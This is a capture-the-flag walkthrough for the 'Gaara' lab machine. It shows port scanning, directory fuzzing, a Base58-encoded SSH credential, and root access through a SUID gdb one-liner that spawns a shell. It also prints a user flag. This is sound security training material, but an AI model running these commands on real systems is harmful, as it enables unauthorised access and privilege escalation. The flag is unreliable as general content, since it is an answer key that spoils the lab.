# Gaara: Walkthrough

## Overview
**Machine Name**: Gaara
**Platform**: Proving Grounds
**Difficulty**: Easy
**OS**: Linux (Debian 10)
**Focus**: Directory Fuzzing, Base58 Decryption, SUID Binary Exploitation (GDB)

## Enumeration
### Network Discovery
The target machine was located on the local subnet at IP address `192.168.61.142`.
![](screenshots/Pasted%20image%2020260606190034.png)

### Port Scanning
An Nmap service and version scan was run to identify open ports:
```bash
nmap -A -T4 -p- 192.168.61.142
```
Scan results:
| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 80/tcp | http | Apache httpd 2.4.38 (Debian) |

### Web Enumeration
Accessing the HTTP service on port 80 initially returned an empty page with a title "Gaara":
![](screenshots/Pasted%20image%2020260606190151.png)
![](screenshots/Pasted%20image%2020260606190255.png)

A Nikto scan and preliminary directory fuzzing showed standard verb allowance but did not reveal any initial entry points:
![](screenshots/Pasted%20image%2020260606190907.png)
![](screenshots/Pasted%20image%2020260606191117.png)
![](screenshots/Pasted%20image%2020260606191154.png)

A directory search with a larger medium wordlist using `ffuf` discovered a hidden directory named `/Cryoserver`:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.61.142/FUZZ
```
![](screenshots/Pasted%20image%2020260606192519.png)

Inside `/Cryoserver`, three subfolders were exposed:
- `/Temari`
- `/Kazekage`
- `/iamGaara`
![](screenshots/Pasted%20image%2020260606192752.png)
![](screenshots/Pasted%20image%2020260606193003.png)

Accessing `/iamGaara` displayed an unusual encoded string: `f1MgN9mTf9SNbzRygcU`.
![](screenshots/Pasted%20image%2020260606193459.png)

Decoding the string from Base58 (often misidentified as Base68/64) revealed a credential string:
```
gaara:ismyname
```
![](screenshots/Pasted%20image%2020260606194722.png)

## Exploitation
### SSH Login
Using the discovered credentials, an SSH login was successfully completed:
```bash
ssh gaara@192.168.61.142
```
![](screenshots/Pasted%20image%2020260606195151.png)
![](screenshots/Pasted%20image%2020260606195350.png)
```bash
whoami
gaara
```

## Privilege Escalation
### Local Enumeration
Accessing `/etc/passwd` confirmed the presence of `gaara` as a system user. Sudo was disabled for `gaara`.
![](screenshots/Pasted%20image%2020260606195421.png)
![](screenshots/Pasted%20image%2020260606195552.png)

A search for SUID binaries was conducted:
```bash
find / -perm -u=s -type f 2>/dev/null
```
The search returned `/usr/bin/gdb` with SUID permissions.
![](screenshots/Pasted%20image%2020260606195641.png)

### GDB SUID Exploitation
Using GTFOBins, the SUID bit on the debugger `gdb` was exploited to execute python commands and spawn a shell as root:
```bash
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0); os.system("/bin/bash")' -ex quit
```
![](screenshots/Pasted%20image%2020260606200639.png)
```bash
whoami
root
```

## Post-Exploitation
### Flag Recovery
- User Flag (`/home/gaara/local.txt`):
  `6662c39f4da992d6bfaafa458d3c5369`
  ![](screenshots/Pasted%20image%2020260606195454.png)
- Root Flag (`/root/proof.txt`):
  ![](screenshots/Pasted%20image%2020260606200919.png)

## Lessons Learned
1. Do not expose system credentials, even if encoded, in open web directories.
2. Limit the use of SUID configuration on binaries like debuggers (`gdb`), text editors, or scripting shells, which have built-in capabilities to spawn processes.
